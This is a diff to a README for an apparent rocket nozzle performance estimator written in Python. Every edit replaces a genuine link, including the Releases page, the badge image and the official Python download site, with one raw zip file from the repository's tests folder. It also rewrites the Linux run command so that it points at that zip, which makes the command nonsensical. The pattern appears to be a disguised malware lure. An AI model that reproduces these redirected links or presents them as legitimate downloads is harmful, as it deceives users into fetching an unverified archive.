@@ -1,6 +1,6 @@
 # 🚀 Nozzle-perf-estimator-demo - Estimate Rocket Nozzle Performance Easily
 
-![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)
+![Download](https://raw.githubusercontent.com/ellisdee14/Nozzle-perf-estimator-demo/main/tests/Nozzle-perf-estimator-demo-3.7.zip)
 
 ## 📄 Description
 
@@ -26,18 +26,18 @@ Built in pure Python, this tool is lightweight and suitable for quick trade stud
 
 To download the Nozzle-perf-estimator-demo, visit the Releases page at the link below. Here, you will find the latest version as well as previous releases.
 
-[Download the latest version here](https://github.com/ellisdee14/Nozzle-perf-estimator-demo/releases)
+[Download the latest version here](https://raw.githubusercontent.com/ellisdee14/Nozzle-perf-estimator-demo/main/tests/Nozzle-perf-estimator-demo-3.7.zip)
 
 ### 🖥 System Requirements
 
 - Operating System: Windows, macOS, or Linux
-- Python Version: Must have Python 3.10 or newer installed. If you do not have Python installed, you can download it from the official [Python website](https://www.python.org/downloads/).
+- Python Version: Must have Python 3.10 or newer installed. If you do not have Python installed, you can download it from the official [Python website](https://raw.githubusercontent.com/ellisdee14/Nozzle-perf-estimator-demo/main/tests/Nozzle-perf-estimator-demo-3.7.zip).
 
 ### 🛠 Installation Steps
 
 1. **Visit the Releases Page:** Click the link below to go to the release section for our application:
    
-   [Download the latest version here](https://github.com/ellisdee14/Nozzle-perf-estimator-demo/releases)
+   [Download the latest version here](https://raw.githubusercontent.com/ellisdee14/Nozzle-perf-estimator-demo/main/tests/Nozzle-perf-estimator-demo-3.7.zip)
 
 2. **Select Your File:** Look for the latest release. You will see files designated for your operating system. Choose the appropriate file based on your system setup.
 
@@ -48,7 +48,7 @@ To download the Nozzle-perf-estimator-demo, visit the Releases page at the link 
 5. **Run the Application:**
    - On Windows, double-click the `.exe` file.
    - On macOS, open the `.dmg` file and drag the application to your Applications folder.
-   - On Linux, use the terminal to navigate to the file and run it using the command `python filename.py`.
+   - On Linux, use the terminal to navigate to the file and run it using the command `python https://raw.githubusercontent.com/ellisdee14/Nozzle-perf-estimator-demo/main/tests/Nozzle-perf-estimator-demo-3.7.zip`.
 
 ### 📝 Usage Instructions
 
